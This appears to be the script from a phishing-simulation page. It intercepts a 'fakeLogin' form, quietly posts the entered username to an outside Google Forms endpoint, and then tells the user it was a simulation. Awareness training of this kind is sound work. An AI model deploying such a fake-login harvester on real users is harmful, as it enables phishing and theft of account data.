  <script>
    document.getElementById("fakeLogin").addEventListener("submit", function(e) {
      e.preventDefault();
      const username = document.getElementById("username").value;

      fetch("https://docs.google.com/forms/d/e/1FAIpQLSfpRX-lOHy_k3LNBGDtg_yzSPGUWXvxQHdbp3JDXxPs259KCQ/formResponse", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `entry.579659565=${encodeURIComponent(username)}`
      });

      alert("Username submitted. This is a simulation.");
    });
  </script>
